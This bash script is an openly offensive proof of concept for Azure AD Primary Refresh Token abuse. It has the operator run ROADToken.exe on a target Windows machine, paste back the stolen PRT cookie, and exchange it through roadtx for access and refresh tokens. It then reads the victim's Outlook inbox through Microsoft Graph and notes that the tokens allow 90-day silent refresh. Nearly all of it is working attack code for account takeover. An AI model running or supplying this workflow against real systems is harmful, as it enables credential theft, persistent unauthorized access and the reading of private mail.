#!/bin/bash
# ─────────────────────────────────────────────────────────────────────────────
# Full PRT PoC workflow — Kali side
# Requires: pip install roadtx  (part of ROADtools)
#
# Step 1 (this machine): get nonce
# Step 2 (target Windows): ROADToken.exe <nonce>  → paste cookie back here
# Step 3 (this machine): authenticate + read Outlook
# ─────────────────────────────────────────────────────────────────────────────

set -e

echo "════════════════════════════════════════════════════"
echo " PRT Token Abuse PoC — Kali workflow"
echo "════════════════════════════════════════════════════"

# ── Step 1: Get a fresh nonce from Azure AD ───────────────────────────────────
echo ""
echo "[*] Step 1 — Requesting sso_nonce from Azure AD..."
NONCE=$(roadtx getnonce 2>/dev/null | grep -oP '(?<=Nonce: )[\w\-\.]+' || true)

if [ -z "$NONCE" ]; then
    # roadtx getnonce may print the nonce directly
    NONCE=$(roadtx getnonce 2>&1 | tail -1 | tr -d '[:space:]')
fi

if [ -z "$NONCE" ]; then
    echo "[-] Could not get nonce via roadtx, trying manual HTTP..."
    NONCE=$(python3 -c "
import urllib.request, urllib.parse, json
url = 'https://login.microsoftonline.com/common/oauth2/token'
data = urllib.parse.urlencode({'grant_type':'srv_challenge'}).encode()
req = urllib.request.Request(url, data=data)
req.add_header('Content-Type','application/x-www-form-urlencoded')
try:
    with urllib.request.urlopen(req, timeout=10) as r:
        nonce = r.headers.get('x-ms-request-nonce','')
        if not nonce:
            body = json.loads(r.read())
            nonce = body.get('Nonce','')
        print(nonce)
except Exception as e:
    print('')
")
fi

if [ -z "$NONCE" ]; then
    echo "[-] Failed to obtain nonce. Check internet/roadtx install."
    exit 1
fi

echo "[+] Nonce: $NONCE"
echo ""
echo "════════════════════════════════════════════════════"
echo " !! ACTION REQUIRED ON TARGET WINDOWS MACHINE !!"
echo ""
echo "   Run this on the target:"
echo "   ROADToken.exe $NONCE"
echo ""
echo "   Then paste the output JSON below."
echo "   (It looks like: {\"response\":[{\"name\":\"x-ms-RefreshTokenCredential\",\"data\":\"eyJ...\"}]})"
echo "════════════════════════════════════════════════════"
echo ""
read -p "Paste BrowserCore JSON output here: " RAW_OUTPUT

# ── Step 2: Extract the PRT cookie from the JSON ─────────────────────────────
echo ""
echo "[*] Step 2 — Extracting PRT cookie from output..."

PRT_COOKIE=$(python3 -c "
import json, sys
raw = '''$RAW_OUTPUT'''
try:
    data = json.loads(raw)
    for item in data.get('response', []):
        if item.get('name') == 'x-ms-RefreshTokenCredential':
            print(item['data'])
            sys.exit(0)
    print('')
except Exception as e:
    # Maybe it was printed as plain text
    import re
    m = re.search(r'\"data\":\"([^\"]+)\"', raw)
    if m:
        print(m.group(1))
    else:
        print('')
")

if [ -z "$PRT_COOKIE" ]; then
    echo "[-] Could not parse PRT cookie from output. Raw was:"
    echo "$RAW_OUTPUT"
    exit 1
fi

echo "[+] PRT Cookie extracted (first 60 chars): ${PRT_COOKIE:0:60}..."
echo ""

# Save cookie for reference
echo "$PRT_COOKIE" > /tmp/prt_cookie.txt
echo "[*] Cookie saved to /tmp/prt_cookie.txt"

# ── Step 3: Authenticate with roadtx ─────────────────────────────────────────
echo ""
echo "[*] Step 3 — Authenticating with PRT cookie via roadtx..."

# roadtx prtauth takes the cookie and exchanges it for tokens
roadtx prtauth --prt-cookie "$PRT_COOKIE" -t tokens.json

if [ ! -f tokens.json ]; then
    echo "[-] roadtx did not produce tokens.json"
    echo "[*] Trying alternative roadtx syntax..."
    roadtx auth --prt-cookie "$PRT_COOKIE" -t tokens.json 2>/dev/null || true
fi

if [ -f tokens.json ]; then
    echo ""
    echo "[+] ════ TOKENS OBTAINED ════"
    python3 -c "
import json
with open('tokens.json') as f:
    t = json.load(f)
print('  access_token  :', t.get('access_token','')[:50]+'...')
print('  refresh_token :', t.get('refresh_token','')[:50]+'...')
print('  expires_in    :', t.get('expires_in'))
print('  scope         :', t.get('scope','')[:80])
"
else
    echo "[!] No tokens.json produced."
fi

# ── Step 4: Read victim Outlook ───────────────────────────────────────────────
echo ""
echo "[*] Step 4 — Reading victim Outlook inbox via Microsoft Graph..."

# Get an access token for Graph if not already scoped for it
roadtx gettokens --tokens-stdin -r https://graph.microsoft.com < tokens.json > graph_tokens.json 2>/dev/null || \
roadtx gettokens -t tokens.json -r https://graph.microsoft.com > graph_tokens.json 2>/dev/null || true

GRAPH_TOKEN=""
if [ -f graph_tokens.json ]; then
    GRAPH_TOKEN=$(python3 -c "import json; t=json.load(open('graph_tokens.json')); print(t.get('access_token',''))")
fi
if [ -z "$GRAPH_TOKEN" ] && [ -f tokens.json ]; then
    GRAPH_TOKEN=$(python3 -c "import json; t=json.load(open('tokens.json')); print(t.get('access_token',''))")
fi

if [ -n "$GRAPH_TOKEN" ]; then
    echo "[*] Fetching inbox messages..."
    python3 -c "
import urllib.request, json
token = '$GRAPH_TOKEN'
req = urllib.request.Request(
    'https://graph.microsoft.com/v1.0/me/messages?\$top=5&\$select=subject,from,receivedDateTime',
    headers={'Authorization': 'Bearer ' + token}
)
try:
    with urllib.request.urlopen(req, timeout=15) as r:
        data = json.loads(r.read())
    print('[+] Inbox (last 5 messages):')
    for msg in data.get('value', []):
        sender = msg.get('from',{}).get('emailAddress',{}).get('address','?')
        subject = msg.get('subject','(no subject)')
        date = msg.get('receivedDateTime','')[:10]
        print(f'  [{date}] From: {sender}')
        print(f'           Subject: {subject}')
        print()
except Exception as e:
    print('[-] Graph call failed:', e)
"
else
    echo "[!] No Graph token available — manual step:"
    echo "    roadtx gettokens -t tokens.json -r https://graph.microsoft.com"
    echo "    Then use the access_token to call https://graph.microsoft.com/v1.0/me/messages"
fi

echo ""
echo "════════════════════════════════════════════════════"
echo " PoC COMPLETE"
echo " tokens.json   — refresh token valid 90 days"
echo " Silent refresh: roadtx refreshtokens -t tokens.json"
echo "════════════════════════════════════════════════════"
